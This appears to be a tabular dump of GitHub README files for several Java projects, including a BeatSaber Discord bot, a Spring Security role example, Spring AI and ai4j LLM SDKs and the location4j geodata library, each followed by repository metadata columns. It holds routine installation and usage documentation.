- **Role Assignment**: Automatically assign roles in Discord based on the player's rank in BeatSaber.
- **Leaderboard**: Display global and country-specific leaderboards within Discord.

## Requirements
- Java 11 or higher
- Maven
- Discord Bot Token
- Access to ScoreSaber API

## Installation
1. Clone the repository:
   ```
   git clone https://github.com/KirDemorgan/BeatSaberDiscordBot.git
   ```
2. Navigate to the project directory:
   ```
   cd BeatSaberDiscordBot
   ```
3. Install dependencies using Maven:
   ```
   mvn install
   ```

## Usage
To start the bot, run:
```
java -jar target/BeatSaberDiscordBot-1.0-SNAPSHOT.jar
```
Make sure to set your Discord bot token and ScoreSaber API key in the `application.properties` file.

## Contributing
Contributions are welcome! Please follow the standard fork -> clone -> branch -> commit -> pull request workflow.



## Contact
KirDemorgan - [@KirDemorgan](https://github.com/KirDemorgan)

Project Link: [https://github.com/KirDemorgan/BeatSaberDiscordBot](https://github.com/KirDemorgan/BeatSaberDiscordBot)

",0,0,1,0.0,"['beatsaber', 'discord', 'bot', 'overview', 'feature', 'requirement', 'installation', 'usage', 'contribute', 'contact']","['beatsaber', 'discord', 'bot', 'overview', 'feature']",1.0,[],0.0,1.0,0.0
Rapter1990/rolepermissionexample,main,"# ROLE WITH PERMISSION THROUGH SPRING SECURITY IN SPRING BOOT

<p align=""center"">
    <img src=""screenshots/spring_boot_role_permission_main_image.png"" alt=""Main Information"" width=""700"" height=""500"">
</p>

### 📖 Information

<ul style=""list-style-type:disc"">
  <li><b>This</b> is a Spring Boot example covering important and useful features.</li>
  <li>Here is an explanation of the example:</li>
       <ul>
         <li><b>Admin</b> and <b>User</b> implement their own <b>authentication</b> and <b>authorization</b> through their defined <b>role</b> names.</li>
         <li>The <b>Admin</b> handles with the following process shown above:
            <ul>
              <li><b>Admin</b> with <b>Role</b> containing <b>create</b> permission only handles with creating product</li>
              <li><b>Admin</b> with <b>Role</b> containing <b>get</b> permission only handles with getting product by id</li>
              <li><b>Admin</b> with <b>Role</b> containing <b>update</b> permission only handles with updating product by id</li>
              <li><b>Admin</b> with <b>Role</b> containing <b>delete</b> permission only handles with deleting product by id</li>
            </ul>
         </li>
         <li>The <b>User</b> handles with the following process shown above:
            <ul>
              <li><b>User</b> with <b>Role</b> containing <b>get</b> permission only handles with getting product by id</li>
            </ul>
         </li>
  </ul>
</ul>


### Explore Rest APIs

<table style=""width:100%"">
  <tr>
      <th>Method</th>
      <th>Url</th>
      <th>Description</th>
      <th>Request Body</th>
      <th>Header</th>
      <th>Valid Path Variable</th>
      <th>No Path Variable</th>
  </tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/register</td>
      <td>User Register</td>
      <td>RegisterRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/login</td>
      <td>User Login</td>
      <td>LoginRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/refresh-token</td>
      <td>User Refresh Token</td>
      <td>TokenRefreshRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/logout</td>
      <td>User Logout</td>
      <td>TokenInvalidateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/products</td>
      <td>Create Product</td>
      <td>ProductCreateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/products/{productId}</td>
      <td>Get Product By Id</td>
      <td></td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/products</td>
      <td>Get Products</td>
      <td>ProductPagingRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>PUT</td>
      <td>/api/v1/products/{productId}</td>
      <td>Update Product By Id</td>
      <td>ProductUpdateRequest</td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
  <tr>
      <td>DELETE</td>
      <td>/api/v1/products/{productId}</td>
      <td>Delete Product By Id</td>
      <td></td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
</table>


### Technologies

---
- Java 21
- Spring Boot 3.0
- Restful API
- Lombok
- Maven
- Junit5
- Mockito
- TestContainer
- Integration Tests
- Docker
- Docker Compose
- CI/CD (Github Actions)
- Postman
- Spring Boot Open Api


### Postman

```
Import postman collection under postman_collection folder
```

### Open Api

```
http://localhost:1225/swagger-ui/index.html
```

### Prerequisites

#### Define Variable in .env file

```
DATABASE_USERNAME={DATABASE_USERNAME}
DATABASE_PASSWORD={DATABASE_PASSWORD}
```

---
- Maven or Docker
---


### Docker Run
The application can be built and run by the `Docker` engine. The `Dockerfile` has multistage build, so you do not need to build and run separately.

Please follow directions shown below in order to build and run the application with Docker Compose file;

```sh
$ cd rolepermissionexample
$ docker-compose up -d
```

If you change anything in the project and run it on Docker, you can also use this command shown below

```sh
$ cd rolepermissionexample
$ docker-compose up --build
```

---
### Maven Run
To build and run the application with `Maven`, please follow the directions shown below;

```sh
$ cd rolepermissionexample
$ mvn clean install
$ mvn spring-boot:run
```

### Screenshots

<details>
<summary>Click here to show the screenshots of project</summary>
    <p> Figure 1 </p>
    <img src =""screenshots/1.PNG"">
    <p> Figure 2 </p>
    <img src =""screenshots/2.PNG"">
    <p> Figure 3 </p>
    <img src =""screenshots/3.PNG"">
    <p> Figure 4 </p>
    <img src =""screenshots/4.PNG"">
    <p> Figure 5 </p>
    <img src =""screenshots/5.PNG"">
    <p> Figure 6 </p>
    <img src =""screenshots/6.PNG"">
    <p> Figure 7 </p>
    <img src =""screenshots/7.PNG"">
    <p> Figure 8 </p>
    <img src =""screenshots/8.PNG"">
</details>

### Contributors

- [Sercan Noyan Germiyanoğlu](https://github.com/Rapter1990)",0,0,1,0.0,"['role', 'with', 'permission', 'through', 'spring', 'security', 'in', 'spring', 'boot', 'information', 'explore', 'rest', 'apis', 'technology', 'postman', 'open', 'api', 'prerequisite', 'define', 'variable', 'file', 'docker', 'run', 'maven', 'run', 'screenshots', 'contributor']","['spring', 'run', 'role', 'with', 'permission']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
wb04307201/easy-ai-spring-boot-starter,master,"# easy-ai-spring-boot-starter
# 易智Spring

[![](https://jitpack.io/v/com.gitee.wb04307201/easy-ai-spring-boot-starter.svg)](https://jitpack.io/#com.gitee.wb04307201/easy-ai-spring-boot-starter)
[![star](https://gitee.com/wb04307201/easy-ai-spring-boot-starter/badge/star.svg?theme=dark)](https://gitee.com/wb04307201/easy-ai-spring-boot-starter)
[![fork](https://gitee.com/wb04307201/easy-ai-spring-boot-starter/badge/fork.svg?theme=dark)](https://gitee.com/wb04307201/easy-ai-spring-boot-starter)
[![star](https://img.shields.io/github/stars/wb04307201/easy-ai-spring-boot-starter)](https://github.com/wb04307201/easy-ai-spring-boot-starter)
[![fork](https://img.shields.io/github/forks/wb04307201/easy-ai-spring-boot-starter)](https://github.com/wb04307201/easy-ai-spring-boot-starter)  
![MIT](https://img.shields.io/badge/License-Apache2.0-blue.svg) ![JDK](https://img.shields.io/badge/JDK-17+-green.svg) ![SpringBoot](https://img.shields.io/badge/Srping%20Boot-3+-green.svg)

> 这不是一个AI大模型，但是可以帮你快速集成AI大模型到Spring项目中，  
> 并通过“检索增强生成(RAG)”的方式建立专家知识库帮助大模型回答问题。  
> 
> 核心功能依赖于[Spring AI](https://docs.spring.io/spring-ai/reference/index.html)实现，RAG运行原理如下  
> ![img_3.png](img_3.png)

## 代码示例
1. 使用[易智Spring](https://gitee.com/wb04307201/easy-ai-spring-boot-starter)实现的[AI大模型Demo](https://gitee.com/wb04307201/easy-ai-demo)

## 快速开始
### 引入依赖
增加 JitPack 仓库
```xml
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>
```
引入jar
```xml
<dependency>
    <groupId>com.github.wb04307201</groupId>
    <artifactId>easy-ai-spring-boot-starter</artifactId>
    <version>0.5.0</version>
</dependency>
```

### 安装向量数据库
通过docker安装chromadb数据库
```shell
docker run -d --name chromadb -p 8000:8000 chromadb/chroma
```

### 安装大语言模型
默认通过[ollama](https://ollama.com/)使用大模型，下载并安装
```shell
# 拉取llama3模型
ollama pull llama3
# 拉取qwen2模型
ollama pull qwen2
```

### 添加相关配置
```yaml
spring:
  application:
    name: spring_ai_demo
  ai:
    ollama:
      chat:
        options:
          #  model: llama3
          model: qwen2
      embedding:
        options:
          model: llama3
      base-url: ""http://localhost:11434""
    vectorstore:
      chroma:
        client:
          host: http://localhost
          port: 8000
        store:
          collection-name: SpringAiCollection
  servlet:
    multipart:
      max-file-size: 10MB
      max-request-size: 10MB
```

### 在启动类上加上`@EnableEasyAi`注解
```java
@EnableEasyAi
@SpringBootApplication
public class EasyAiDemoApplication {

    public static void main(String[] args) {
        SpringApplication.run(EasyAiDemoApplication.class, args);
    }

}
```

### 使用大模型对话
内置聊天界面http://ip:端口/easy/ai/chat  
![img.png](img.png)

### 使用专家知识库的大模型对话
内置上传界面http://ip:端口/easy/ai/list  
![img_1.png](img_1.png)
状态列显示“向量存储完”即文档已转入知识库  
内置聊天界面http://ip:端口/easy/ai/chat  
![img_2.png](img_2.png)

## 高级
### 使用大模型API
这里以[智谱AI](https://open.bigmodel.cn/)为例，如何对接大模型API  
修改项目依赖，支持的大模型平台可到[Spring AI](https://docs.spring.io/spring-ai/reference/index.html)查看  
```xml
        <dependency>
            <groupId>com.gitee.wb04307201</groupId>
            <artifactId>easy-ai-spring-boot-starter</artifactId>
            <version>0.5.0</version>
            <exclusions>
                <exclusion>
                    <groupId>org.springframework.ai</groupId>
                    <artifactId>spring-ai-ollama-spring-boot-starter</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        <dependency>
            <groupId>org.springframework.ai</groupId>
            <artifactId>spring-ai-zhipuai-spring-boot-starter</artifactId>
            <version>1.0.0-SNAPSHOT</version>
        </dependency>
```
修改配置项目
```yaml
spring:
  ai:
    zhipuai:
      api-key: 智谱AI API Key
```
> 除了大模型API外，向量数据库也可以参照上面的方式进行替换",0,0,2,0.0,"['model', 'enableeasyai']","['model', 'enableeasyai']",1.0,[],0.0,1.0,0.0
tomaytotomato/location4j,master,"# location4j 🌎4️⃣♨️

![GitHub branch check runs](https://img.shields.io/github/check-runs/tomaytotomato/location4j/master)
[![Bugs](https://sonarcloud.io/api/project_badges/measure?project=tomaytotomato_location4j&metric=bugs)](https://sonarcloud.io/summary/new_code?id=tomaytotomato_location4j)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=tomaytotomato_location4j&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=tomaytotomato_location4j)
[![javadoc](https://javadoc.io/badge2/com.tomaytotomato/location4j/1.0.3/javadoc.svg)](https://javadoc.io/doc/com.tomaytotomato/location4j/1.0.3)
![GitHub commit activity](https://img.shields.io/github/commit-activity/m/tomaytotomato/location4j)
![GitHub License](https://img.shields.io/github/license/tomaytotomato/location4j)

location4j is a simple Java library designed for efficient and accurate geographical data lookups
for countries, states, and cities. 🗺️

Unlike other libraries, it operates without relying on third-party APIs, making it both
cost-effective and fast. 🏎️

Its built-in dataset provides quick lookups and no need for external HTTP calls. 📀

## Setup 🚀

Get the latest version of the location4j library by adding it to your Maven pom.xml

```xml

<dependency>
    <groupId>com.tomaytotomato</groupId>
    <artifactId>location4j</artifactId>
    <version>1.0.5</version>
</dependency>
```

**Gradle**

```gradle
implementation group: 'com.tomaytotomato', name: 'location4j', version: '1.0.5'
```

## Quick Example 🏗

```java
import com.tomaytotomato.SearchLocationService;

public class Main {

    public static void main(String[] args) {
        SearchLocationService searchLocationService = SearchLocationService.builder().build();

        // Find all locations named San Francisco
        List<Location> results = searchLocationService.search(""san francisco"");
        printResults(results);

        // Narrow search to the US
        results = searchLocationService.search(""san francisco, us"");
        printResults(results);

        // Narrow search further to California
        results = searchLocationService.search(""san francisco, us california"");
        printResults(results);
    }

    private static void printResults(List<Location> results) {
        System.out.println(""Locations found: "" + results.size());
        results.forEach(location -> {
            System.out.println(""Country: "" + location.getCountryName());
            System.out.println(""State: "" + location.getStateName());
            System.out.println(""City: "" + location.getCityName());
        });
    }
}

```

## Features 🔬

| Feature                         | Supported | Object   | Example                                                                         |
|---------------------------------|-----------|----------|---------------------------------------------------------------------------------|
| Search (free text)              | ✅         | Location | `search(""kyiv"")` -> `""Kyiv, Ukraine, Europe, UA""`                               |
| Find All Countries              | ✅         | Country  | `findAllCountries()` -> `[""Belgium"", ""Canada"", ...]`                            |
| Find Country by Id              | ✅         | Country  | `findCountryById(1)` -> `[""Afghanistan""]`                                       |
| Find Country by ISO2 code       | ✅         | Country  | `findCountryByISO2Code(""CA"")` -> `[""Canada""]`                                   |
| Find Country by ISO3 code       | ✅         | Country  | `findCountryByISO3Code(""CAN"")` -> `[""Canada""]`                                  |
| Find Country by Name            | ✅         | Country  | `findCountryByName(""Canada"")` -> `[""Canada""]`                                   |
| Find Country by Localised name  | ✅         | Country  | `findCountryByLocalisedName(""Belgique"")` -> `[""Belgium""]`                       |
| Find Countries by State name    | ✅         | Country  | `findAllCountriesByStateName(""Texas"")` -> `[""USA""]`                             |
| Find States by State name       | ✅         | State    | `findAllStatesByStateName(""Texas"")` -> `[""Texas"", ""USA""]`                       |
| Find State by State Id          | ✅         | State    | `findStateById(5)` -> `[""California"", ""USA""]`                                   |
| Find States by State code       | ✅         | State    | `findAllStatesByStateCode(""CA"")` -> `[""California"", ""USA""]`                     |
| Find City by City Id            | ✅         | City     | `findCityById(10)` -> `[""Los Angeles"", ""California""]`                           |
| Find City by latitude/longitude | ✅         | City     | `findClosestCityByLatLong(30.438, -84.280)` -> `[""Tallahassee"", ""Florida""]`     |
| Find Cities by City name        | ✅         | City     | `findAllCitiesByCityName(""San Francisco"")` -> `[""San Francisco"", ""California""]` |

🟢 location4j can parse free text strings with or without punctuation or capitalisation e.g.
> San Francisco, CA, USA
>
> ca united states san francisco
>
> US, San Francisco, california

🟢 Latitude/Longitude searches can use `double`, `BigDecimal`, or `String` inputs for both values;
the types must match (
you can't mix a `String` latitude with a `BigDecimal` or `double` longitude) but the API will accept
any of the three
types.

🔴 location4j cannot find a location based on a small town, street, or
zipcode/postcode.

## More Examples 🧪

**Lookup countries**

For simple lookups the `LocationService` can act like a repository, allow the retrieval of
countries, states and city information.

```java

import com.tomaytotomato.LocationService;

public class LocationServiceExample {

    public static void main(String[] args) {
        LocationService locationService = LocationService.builder().build();

        // Get all countries
        List<Country> countries = locationService.findAllCountries();

        // Filter European countries
        List<Country> europeanCountries = countries.stream()
                .filter(country -> ""Europe"".equals(country.getRegion()))
                .toList();

        // Find Afghanistan by ID
        Country afghanistan = locationService.findCountryById(1);

        // Find all cities named San Francisco
        List<City> cities = locationService.findAllCities(""San Francisco"");

    }
}

```

**Search locations**

Search any text for a location, the `SearchLocationService` can handle formatted or unformatted
text. It will try and find matches against a variety of keywords it has in its dataset.

```java

import com.tomaytotomato.SearchLocationService;

public class SearchLocationServiceExample {

    public static void main(String[] args) {
        SearchLocationService searchLocationService = SearchLocationService.builder()
            .withTextNormaliser(new DefaultTextNormaliser())
            .build();

        // Search for Santa Clara
        List<Location> results = searchLocationService.search(""Santa Clara"");

        // Search for Santa Clara in the USA
        List<Location> resultsUnitedStates = searchLocationService.search(""Santa Clara USA"");

        // Search for Santa Clara in California (it works with ISO2 or ISO3) codes
        List<Location> resultsCalifornia = searchLocationService.search(""Santa Clara US CA"");
    }
}

```

## Motivation 🌱

Parsing location data efficiently is crucial for many applications, yet it can be complex and
time-consuming.

Third-party services like Google Location API can be costly, and using large language models can
introduce significant latency.

location4j offers a practical solution with its own dataset, enabling fast and cost-effective
geographical lookups to a city/town level (which is sufficient in most cases).

This allows applications to be built without another external dependency and the overheads that come
with it.

I may add other functionality in the future if needed e.g. geolocation to nearest place, geofencing
etc.

## Credits 🙏

Country data sourced
from [dr5shn/countries-states-cities-database](https://github.com/dr5hn/countries-states-cities-database) [![License: ODbL](https://img.shields.io/badge/License-ODbL-brightgreen.svg)](https://opendatacommons.org/licenses/odbl/)

## License 📜

[MIT License](https://choosealicense.com/licenses/mit/)

",6,4,3,15.0,"['setup', 'quick', 'example', 'feature', 'more', 'example', 'motivation', 'credit', 'license']","['example', 'setup', 'quick', 'feature', 'more']",3.0,"[com.diffplug.spotless:spotless-maven-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jacoco:jacoco-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,2.0,1.0
phegondev/Ecommerce-Springboot,master,"# Ecommerce Platform
## Clone the repository and check out the branch corresponding to the technology you are familiar with to view the source code

<img width=""1382"" alt=""home"" src=""https://github.com/user-attachments/assets/cee35157-33ac-472c-9137-7021ae168a9b"">

",0,0,3,0.0,"['ecommerce', 'platform', 'clone', 'repository', 'check', 'branch', 'correspond', 'technology', 'familiar', 'view', 'source', 'code']","['ecommerce', 'platform', 'clone', 'repository', 'check']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
LnYo-Cly/ai4j,main,"![Maven Central](https://img.shields.io/maven-central/v/io.github.lnyo-cly/ai4j?color=blue)
# ai4j
一款JavaSDK用于快速接入AI大模型应用，整合多平台大模型，如OpenAi、Ollama、智谱Zhipu(ChatGLM)、深度求索DeepSeek、月之暗面Moonshot(Kimi)、腾讯混元Hunyuan、零一万物(01)等等，提供统一的输入输出(对齐OpenAi)消除差异化，优化函数调用(Tool Call)，优化RAG调用、支持向量数据库(Pinecone)，并且支持JDK1.8，为用户提供快速整合AI的能力。


## 支持的平台
+ OpenAi
+ Zhipu(智谱)
+ DeepSeek(深度求索)
+ Moonshot(月之暗面)
+ Hunyuan(腾讯混元)
+ Lingyi(零一万物)
+ Ollama
+ 待添加(Qwen Llama MiniMax...)

## 支持的服务
+ Chat Completions（流式与非流式）
+ Embedding
+ 待添加

## 特性
+ 支持Spring以及普通Java应用、支持Java 8以上的应用
+ 多平台、多服务
+ 统一的输入输出
+ 统一的错误处理
+ 支持流式输出。支持函数调用参数流式输出
+ 轻松使用Tool Calls
+ 支持多个函数同时调用（智谱不支持）
+ 支持stream_options，流式输出直接获取统计token usage
+ 支持RAG，内置向量数据库支持: Pinecone
+ 使用Tika读取文件
+ Token统计`TikTokensUtil.java`

## 更新日志
+ [2024-09-26] 修复有关Pinecone向量数据库的一些问题。发布0.6.3版本
+ [2024-09-20] 增加对Ollama平台的支持，并修复一些bug。发布0.6.2版本
+ [2024-09-19] 增加错误处理链，统一处理为openai错误类型; 修复部分情况下URL拼接问题，修复拦截器中response重复调用而导致的关闭问题。发布0.5.3版本
+ [2024-09-12] 修复上个问题OpenAi参数导致错误的遗漏，发布0.5.2版本
+ [2024-09-12] 修复SpringBoot 2.6以下导致OkHttp变为3.14版本的报错问题；修复OpenAi参数`parallel_tool_calls`在tools为null时的异常问题。发布0.5.1版本。
+ [2024-09-09] 新增零一万物大模型支持、发布0.5.0版本。
+ [2024-09-02] 新增腾讯混元Hunyuan平台支持（注意：所需apiKey 属于SecretId与SecretKey的拼接，格式为 {SecretId}.{SecretKey}），发布0.4.0版本。
+ [2024-08-30] 新增对Moonshot(Kimi)平台的支持，增加`OkHttpUtil.java`实现忽略SSL证书的校验。
+ [2024-08-29] 新增对DeepSeek平台的支持、新增stream_options可以直接统计usage、新增错误拦截器`ErrorInterceptor.java`、发布0.3.0版本。
+ [2024-08-29] 修改SseListener以兼容智谱函数调用。
+ [2024-08-28] 添加token统计、添加智谱AI的Chat服务、优化函数调用可以支持多轮多函数。
+ [2024-08-17] 增强SseListener监听器功能。发布0.2.0版本。

## 教程文档
+ [快速接入SpringBoot、接入流式与非流式以及函数调用](http://t.csdnimg.cn/iuIAW)
+ [Java快速接入qwen2.5、llama3.1等Ollama平台开源大模型](https://blog.csdn.net/qq_35650513/article/details/142408092?spm=1001.2014.3001.5501)
+ [Java搭建法律AI助手，快速实现RAG应用](https://blog.csdn.net/qq_35650513/article/details/142568177?fromshare=blogdetail&sharetype=blogdetail&sharerId=142568177&sharerefer=PC&sharesource=qq_35650513&sharefrom=from_link)

## 其它支持
+ [[低价中转平台] 低价ApiKey—限时特惠 0.7:1—支持最新o1模型](https://api.trovebox.online/)

# 快速开始
## 导入
### Gradle
```groovy
implementation group: 'io.github.lnyo-cly', name: 'ai4j', version: '${project.version}'
```

```groovy
implementation group: 'io.github.lnyo-cly', name: 'ai4j-spring-boot-stater', version: '${project.version}'
```


### Maven
```xml
<!-- 非Spring应用 -->
<dependency>
    <groupId>io.github.lnyo-cly</groupId>
    <artifactId>ai4j</artifactId>
    <version>${project.version}</version>
</dependency>

```
```xml
<!-- Spring应用 -->
<dependency>
    <groupId>io.github.lnyo-cly</groupId>
    <artifactId>ai4j-spring-boot-stater</artifactId>
    <version>${project.version}</version>
</dependency>
```

## 获取AI服务实例

### 非Spring获取
```java
    public void test_init(){
        OpenAiConfig openAiConfig = new OpenAiConfig();

        Configuration configuration = new Configuration();
        configuration.setOpenAiConfig(openAiConfig);

        HttpLoggingInterceptor httpLoggingInterceptor = new HttpLoggingInterceptor();
        httpLoggingInterceptor.setLevel(HttpLoggingInterceptor.Level.HEADERS);

        OkHttpClient okHttpClient = new OkHttpClient
                .Builder()
                .addInterceptor(httpLoggingInterceptor)
                .addInterceptor(new ErrorInterceptor())
                .connectTimeout(300, TimeUnit.SECONDS)
                .writeTimeout(300, TimeUnit.SECONDS)
                .readTimeout(300, TimeUnit.SECONDS)
                .proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(""127.0.0.1"",10809)))
                .build();
        configuration.setOkHttpClient(okHttpClient);

        AiService aiService = new AiService(configuration);

        embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);
        chatService = aiService.getChatService(PlatformType.getPlatform(""OPENAI""));

    }
```
### Spring获取
```yml
# 国内访问默认需要代理
ai:
  openai:
    api-key: ""api-key""
  okhttp:
    proxy-port: 10809
    proxy-url: ""127.0.0.1""
  zhipu:
    api-key: ""xxx""
  #other...
```

```java
// 注入Ai服务
@Autowired
private AiService aiService;

// 获取需要的服务实例
IChatService chatService = aiService.getChatService(PlatformType.OPENAI);
IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);
// ......
```

## Chat服务

### 同步请求调用
```java

public void test_chat() throws Exception {
    // 获取chat服务实例
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // 构建请求参数
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""鲁迅为什么打周树人""))
            .build();

    // 发送对话请求
    ChatCompletionResponse response = chatService.chatCompletion(chatCompletion);

    System.out.println(response);
}

```

### 流式调用
```java
public void test_chat_stream() throws Exception {
    // 获取chat服务实例
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // 构造请求参数
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""查询北京明天的天气""))
            .functions(""queryWeather"")
            .build();


    // 构造监听器
    SseListener sseListener = new SseListener() {
        @Override
        protected void send() {
            System.out.println(this.getCurrStr());
        }
    };
    // 显示函数参数，默认不显示
    sseListener.setShowToolArgs(true);

    // 发送SSE请求
    chatService.chatCompletionStream(chatCompletion, sseListener);

    System.out.println(sseListener.getOutput());

}
```

### 图片识别

```java
public void test_chat_image() throws Exception {
    // 获取chat服务实例
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // 构建请求参数
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""图片中有什么东西"", ""https://cn.bing.com/images/search?view=detailV2&ccid=r0OnuYkv&id=9A07DE578F6ED50DB59DFEA5C675AC71845A6FC9&thid=OIP.r0OnuYkvsbqBrYk3kUT53AHaKX&mediaurl=https%3a%2f%2fimg.zcool.cn%2fcommunity%2f0104c15cd45b49a80121416816f1ec.jpg%401280w_1l_2o_100sh.jpg&exph=1792&expw=1280&q=%e5%b0%8f%e7%8c%ab%e5%9b%be%e7%89%87&simid=607987191780608963&FORM=IRPRST&ck=12127C1696CF374CB9D0F09AE99AFE69&selectedIndex=2&itb=0&qpvt=%e5%b0%8f%e7%8c%ab%e5%9b%be%e7%89%87""))
            .build();

    // 发送对话请求
    ChatCompletionResponse response = chatService.chatCompletion(chatCompletion);

    System.out.println(response);
}
```

### 函数调用

```java
public void test_chat_tool_call() throws Exception {
    // 获取chat服务实例
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // 构建请求参数
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""今天北京天气怎么样""))
            .functions(""queryWeather"")
            .build();

    // 发送对话请求
    ChatCompletionResponse response = chatService.chatCompletion(chatCompletion);

    System.out.println(response);
}
```
#### 定义函数
```java
@FunctionCall(name = ""queryWeather"", description = ""查询目标地点的天气预报"")
public class QueryWeatherFunction implements Function<QueryWeatherFunction.Request, String> {

    @Data
    @FunctionRequest
    public static class Request{
        @FunctionParameter(description = ""需要查询天气的目标位置, 可以是城市中文名、城市拼音/英文名、省市名称组合、IP 地址、经纬度"")
        private String location;
        @FunctionParameter(description = ""需要查询未来天气的天数, 最多15日"")
        private int days = 15;
        @FunctionParameter(description = ""预报的天气类型，daily表示预报多天天气、hourly表示预测当天24天气、now为当前天气实况"")
        private Type type;
    }

    public enum Type{
        daily,
        hourly,
        now
    }

    @Override
    public String apply(Request request) {
        final String key = """";

        String url = String.format(""https://api.seniverse.com/v3/weather/%s.json?key=%s&location=%s&days=%d"",
                request.type.name(),
                key,
                request.location,
                request.days);


        OkHttpClient client = new OkHttpClient();

        okhttp3.Request http = new okhttp3.Request.Builder()
                .url(url)
                .get()
                .build();

        try (Response response = client.newCall(http).execute()) {
            if (response.isSuccessful()) {
                // 解析响应体
                return response.body() != null ? response.body().string() : """";
            } else {
                return ""获取天气失败 当前天气未知"";
            }
        } catch (Exception e) {
            // 处理异常
            e.printStackTrace();
            return ""获取天气失败 当前天气未知"";
        }
    }

}
```

## Embedding服务

```java
public void test_embed() throws Exception {
    // 获取embedding服务实例
    IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);

    // 构建请求参数
    Embedding embeddingReq = Embedding.builder().input(""1+1"").build();

    // 发送embedding请求
    EmbeddingResponse embeddingResp = embeddingService.embedding(embeddingReq);

    System.out.println(embeddingResp);
}
```

## RAG
### 配置向量数据库
```yml
ai:
  vector:
    pinecone:
      url: """"
      key: """"
```
### 获取实例
```java
@Autowired
private PineconeService pineconeService;
```
### 插入向量数据库
```java
public void test_insert_vector_store() throws Exception {
    // 获取embedding服务实例
    IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);

    // Tika读取file文件内容
    String fileContent = TikaUtil.parseFile(new File(""D:\\data\\test\\test.txt""));

    // 分割文本内容
    RecursiveCharacterTextSplitter recursiveCharacterTextSplitter = new RecursiveCharacterTextSplitter(1000, 200);
    List<String> contentList = recursiveCharacterTextSplitter.splitText(fileContent);

    // 转为向量
    Embedding build = Embedding.builder()
            .input(contentList)
            .model(""text-embedding-3-small"")
            .build();
    EmbeddingResponse embedding = embeddingService.embedding(build);
    List<List<Float>> vectors = embedding.getData().stream().map(EmbeddingObject::getEmbedding).collect(Collectors.toList());
    VertorDataEntity vertorDataEntity = new VertorDataEntity();
    vertorDataEntity.setVector(vectors);
    vertorDataEntity.setContent(contentList);
    
    // 向量存储
    Integer count = pineconeService.insert(vertorDataEntity, ""userId"");

}
```
### 从向量数据库查询
```java
public void test_query_vector_store() throws Exception {
    // 获取embedding服务实例
    IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);

    // 构建要查询的问题，转为向量
    Embedding build = Embedding.builder()
            .input(""question"")
            .model(""text-embedding-3-small"")
            .build();
    EmbeddingResponse embedding = embeddingService.embedding(build);
    List<Float> question = embedding.getData().get(0).getEmbedding();

    // 构建向量数据库的查询对象
    PineconeQuery pineconeQueryReq = PineconeQuery.builder()
            .namespace(""userId"")
            .vector(question)
            .build();

    String result = pineconeService.query(pineconeQueryReq, "" "");
    
    // 携带result，与chat服务进行对话
    // ......
}
```

### 删除向量数据库数据
```java
public void test_delete_vector_store() throws Exception {
    // 构建参数
    PineconeDelete pineconeDelete = PineconeDelete.builder()
                                    .deleteAll(true)
                                    .namespace(""userId"")
                                    .build();
    // 删除
    Boolean res = pineconeService.delete(pineconeDelete);
}
```



# 为AI4J提供贡献
欢迎您对AI4J提出建议、报告问题或贡献代码。您可以按照以下的方式为AI4J提供贡献: 

## 问题反馈
请使用GitHub Issue页面报告问题。尽可能具体地说明如何重现您的问题，包括操作系统、Java版本和任何相关日志跟踪等详细信息。

## PR
1. Fork 本仓库并创建您的分支。
2. 编写您的代码，并进行测试。
3. 确保您的代码符合现有的样式。
4. 提交时编写清晰的日志信息。对于小的改动，单行信息就可以了，但较大的改动应该有详细的描述。
5. 完成拉取请求表单，确保在`dev`分支进行改动，链接到您的 PR 解决的问题。

# 支持
如果您觉得这个项目对您有帮助，请点一个star⭐。


# 贡献者

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

